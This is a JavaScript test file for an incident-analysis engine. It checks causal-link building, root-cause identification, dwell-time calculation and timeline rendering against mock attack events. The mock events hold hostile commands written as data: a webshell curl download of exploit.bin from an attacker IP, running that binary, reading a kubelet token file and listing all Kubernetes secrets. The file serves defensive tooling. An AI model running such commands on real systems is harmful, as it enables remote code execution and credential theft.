import assert from 'node:assert';
import React from 'react';
import {
  buildCausalTimeline,
  identifyRootCause,
  calculateDwellTime,
  renderAsciiTimeline,
  CAUSAL_RELATIONS
} from '../src/engine/timeline.js';
import { TimelineView } from '../src/ui/TimelineView.js';

async function runTests() {
  console.log('🧪 Testing Automated Root-Cause DAG Synthesis & Attack Timeline Engine...');

  const mockEvents = [
    {
      id: 'evt-1',
      timestamp: 1700000000000,
      type: 'NETWORK_INGRESS',
      title: 'Inbound HTTP Post on Port 8080',
      entity: 'web-prod',
      srcIp: '198.51.100.2',
      dstPort: 8080,
      mitreTechnique: 'T1190',
      severity: 'MEDIUM'
    },
    {
      id: 'evt-2',
      timestamp: 1700000002000, // +2s (within 10s network trigger window)
      type: 'PROCESS_EXEC',
      title: 'WebShell Invocation',
      entity: 'web-prod',
      pid: 200,
      ppid: 1,
      command: '/bin/bash -c curl -O http://198.51.100.2/exploit.bin',
      file: 'exploit.bin',
      mitreTechnique: 'T1505.003',
      severity: 'CRITICAL'
    },
    {
      id: 'evt-3',
      timestamp: 1700000006000, // +4s
      type: 'FILE_WRITE_THEN_EXEC',
      title: 'Execute Downloaded Exploit',
      entity: 'web-prod',
      pid: 205,
      ppid: 200, // child of PID 200
      command: 'chmod +x exploit.bin && ./exploit.bin',
      file: 'exploit.bin',
      mitreTechnique: 'T1059.004',
      severity: 'CRITICAL'
    },
    {
      id: 'evt-4',
      timestamp: 1700000020000, // +14s
      type: 'CREDENTIAL_ACCESS',
      title: 'Dumped Kubelet Secrets',
      entity: 'web-prod',
      pid: 205,
      command: 'cat /var/lib/kubelet/pods/token',
      mitreTechnique: 'T1003',
      severity: 'HIGH'
    },
    {
      id: 'evt-5',
      timestamp: 1700000035000, // +15s (within 60s credential to lateral window)
      type: 'LATERAL_MOVEMENT',
      title: 'API Lateral Query',
      entity: 'kube-apiserver',
      pid: 350,
      command: 'kubectl get secrets --all-namespaces',
      mitreTechnique: 'T1021',
      severity: 'CRITICAL'
    }
  ];

  // Test 1: DAG Construction
  const dag = buildCausalTimeline(mockEvents);
  assert.strictEqual(dag.nodes.length, 5, 'Must have 5 event nodes');
  assert.ok(dag.edges.length >= 3, 'Must establish causal relationships');

  // Verify specific causality links
  const netTriggerEdge = dag.edges.find(e => e.type === CAUSAL_RELATIONS.NETWORK_INITIATED);
  assert.ok(netTriggerEdge, 'Must synthesize NETWORK_INITIATED link between evt-1 and evt-2');
  assert.strictEqual(netTriggerEdge.from, 'evt-1');
  assert.strictEqual(netTriggerEdge.to, 'evt-2');

  const processSpawnEdge = dag.edges.find(e => e.type === CAUSAL_RELATIONS.SPAWNED_BY);
  assert.ok(processSpawnEdge, 'Must synthesize SPAWNED_BY link from PID 200 to child PID 205');
  assert.strictEqual(processSpawnEdge.from, 'evt-2');
  assert.strictEqual(processSpawnEdge.to, 'evt-3');

  const credLateralEdge = dag.edges.find(e => e.type === CAUSAL_RELATIONS.CREDENTIAL_STOLEN_THEN_USED);
  assert.ok(credLateralEdge, 'Must synthesize CREDENTIAL_STOLEN_THEN_USED link between dump and lateral query');
  console.log(`✔ Test 1 passed: buildCausalTimeline synthesized ${dag.edges.length} multi-modal causal edges.`);

  // Test 2: Root Cause Identification
  const rootResult = identifyRootCause(dag);
  assert.ok(rootResult.rootCauseNode, 'Must identify a root cause node');
  assert.strictEqual(rootResult.rootCauseNode.id, 'evt-1', 'Initial network ingress must be identified as root cause');
  assert.strictEqual(rootResult.cascadeLength >= 3, true, 'Cascade length must encompass downstream attack flow');
  assert.ok(rootResult.confidence >= 0.7, 'Confidence score must be high for full cascade');
  console.log(`✔ Test 2 passed: identifyRootCause pinpointed root cause [${rootResult.rootCauseNode.title}] with ${(rootResult.confidence * 100).toFixed(0)}% confidence.`);

  // Test 3: Dwell Time Calculation
  const dwell = calculateDwellTime(dag);
  // Total span: 1700000035000 - 1700000000000 = 35000ms = 35s
  assert.strictEqual(dwell.dwellTimeMs, 35000);
  assert.strictEqual(dwell.dwellTimeString, '35s');
  // First detection: evt-2 (timestamp: 1700000002000, 2s into attack)
  assert.strictEqual(dwell.timeToDetectMs, 2000);
  assert.strictEqual(dwell.timeToDetectString, '2s');
  assert.strictEqual(dwell.timeToRemediateMs, 33000);
  console.log(`✔ Test 3 passed: calculateDwellTime resolved dwell time: ${dwell.dwellTimeString}, MTTD: ${dwell.timeToDetectString}.`);

  // Test 4: ASCII Timeline Rendering
  const ascii = renderAsciiTimeline(dag);
  assert.ok(ascii.includes('VIGILANTE CAUSAL ATTACK TIMELINE'));
  assert.ok(ascii.includes('ROOT CAUSE'));
  assert.ok(ascii.includes('WebShell Invocation'));
  console.log('✔ Test 4 passed: renderAsciiTimeline generated comprehensive terminal visual tree.');

  // Test 5: React Ink TimelineView Component Instantiation
  const elem = React.createElement(TimelineView, { initialEvents: mockEvents });
  assert.ok(elem, 'TimelineView element must be instantiated successfully');
  console.log('✔ Test 5 passed: TimelineView component constructed cleanly with React.createElement.');

  console.log('🎉 All Automated Root-Cause DAG Synthesis & Attack Timeline tests passed successfully!');
}

runTests().catch(err => {
  console.error('❌ Timeline tests failed:', err);
  process.exit(1);
});
